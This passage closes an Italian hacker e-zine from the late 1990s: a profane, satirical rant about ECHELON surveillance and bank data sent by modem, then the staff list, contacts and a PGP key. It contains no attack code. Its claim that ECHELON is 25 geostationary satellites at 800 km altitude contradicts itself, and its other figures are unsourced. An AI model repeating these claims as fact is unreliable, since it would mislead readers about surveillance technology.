Sbattete giu' il telefono, e bestemmiando tornate a letto. Non riuscite a
prendere sonno e pensate a cio' che quella persona vi aveva appena riferito.
Presi dal panico vi fiondate in bagno e controllate la vostra zona anale.
Con somma sorpresa scoprite che avete sul serio le emorroidi.... Tra mille
brutti pensieri alle varie divinita' (-> bestemmie varie ed assortite <-) vi
ponete una questione: "Ma come cazzo faceva a sapere quella persona che io
avevo le emorroidi?".
La risposta e' piu' semplice e stravolgente di quanto possiate immaginare!.
Quando vi siete rigirati nel letto ECHELON vi stava osservando.
ECHELON e' una rete di 25 satelliti geostazionari situati a 800 km di altezza
perennemente collegati a 5 basi terrestri. Lui puo' sapere tutto quello
che si dice al telefono, via fax, in e-mail, via telex: potenzialmente puo'
ricevere 100 milioni di informazioni in 24 ore. Anche i satelliti ci scrutano
(i GPS non li ha inventati Mago Merlino...) e non solo per scopi militari del
cazzo (insomma lo volete fare o no l'amore anziche' la guerra?!?!).
E visto che abbiamo fatto 30...facciamo anche 31. Proprio oggi, mentre ero in
bagno a c*@4%e (spero che ECHELON fosse girato da un'altra parte) stavo
leggendo un articolo di Panorama (da cui ho liberamente tratto alcune frasi) e
tho'...che ci trovo? Dopo tutto quello che vi ho raccontato scopro che per la
sicurezza del fisco (?) ben 55 milioni di numeri di c/c e i nominativi dei
relativi intestatari si faranno un bel giretto via modem.
ALLA FACCIA DELLA PRIVACY!!!
Comunque togliete quelle lamette dalle vostre vene...non ne vale la pena.
Io vi ho solo messo al corrente di cosa PUO' accadere oggi. Non tutto il male
viene per nuocere. Pero' prima di fare qualsiasi cosa...pensateci 2 o 3 volte.
-> Tengo a precisare che l'uomo con le emorroidi e' puramente inventato, era
solo a titolo di esempio. <-

     THIS IS A WARNING SO YOU TAKE HEED. THIS COMING VISION IS REALITY.
                        (oBsoLeTe - Fear Facotory, 1998)
Pr3DaToR


[ REDAZi0NE ]-----------------------------------------------------------------
	b0z0 - Cavallo - Dashie - Dr.Bluedump - FuSyS - Jaiss - Nello|Z
	pIGpEN - Pr3DaToR - |scacco| - SMaster - \sPIRIT\ - Technolord
	|TsuNaMi|

[ WEB ]-----------------------------------------------------------------------
	http://www.sourceofkaos.com/homes/s0ftpj/
	http://softpj98.bbk.org/bfi/

[ E-MAiL ]--------------------------------------------------------------------
	bfi98@usa.net

[ PGP ]-----------------------------------------------------------------------
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: 2.6.3i

mQENAzZsSu8AAAEIAM5FrActPz32W1AbxJ/LDG7bB371rhB1aG7/AzDEkXH67nni
DrMRyP+0u4tCTGizOGof0s/YDm2hH4jh+aGO9djJBzIEU8p1dvY677uw6oVCM374
nkjbyDjvBeuJVooKo+J6yGZuUq7jVgBKsR0uklfe5/0TUXsVva9b1pBfxqynK5OO
lQGJuq7g79jTSTqsa0mbFFxAlFq5GZmL+fnZdjWGI0c2pZrz+Tdj2+Ic3dl9dWax
iuy9Bp4Bq+H0mpCmnvwTMVdS2c+99s9unfnbzGvO6KqiwZzIWU9pQeK+v7W6vPa3
TbGHwwH4iaAWQH0mm7v+KdpMzqUPucgvfugfx+kABRO0FUJmSTk4IDxiZmk5OEB1
c2EubmV0PokBFQMFEDZsSu+5yC9+6B/H6QEBb6EIAMRP40T7m4Y1arNkj5enWC/b
a6M4oog42xr9UHOd8X2cOBBNB8qTe+dhBIhPX0fDJnnCr0WuEQ+eiw0YHJKyk5ql
GB/UkRH/hR4IpA0alUUjEYjTqL5HZmW9phMA9xiTAqoNhmXaIh7MVaYmcxhXwoOo
WYOaYoklxxA5qZxOwIXRxlmaN48SKsQuPrSrHwTdKxd+qB7QDU83h8nQ7dB4MAse
gDvMUdspekxAX8XBikXLvVuT0ai4xd8o8owWNR5fQAsNkbrdjOUWrOs0dbFx2K9J
l3XqeKl3XEgLvVG8JyhloKl65h9rUyw6Ek5hvb5ROuyS/lAGGWvxv2YJrN8ABLo=
=o7CG
-----END PGP PUBLIC KEY BLOCK-----


--------------------[ BUTCHERED ]---[ FR0M ]---[ iNSiDE ]---------------------
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
==============================================================================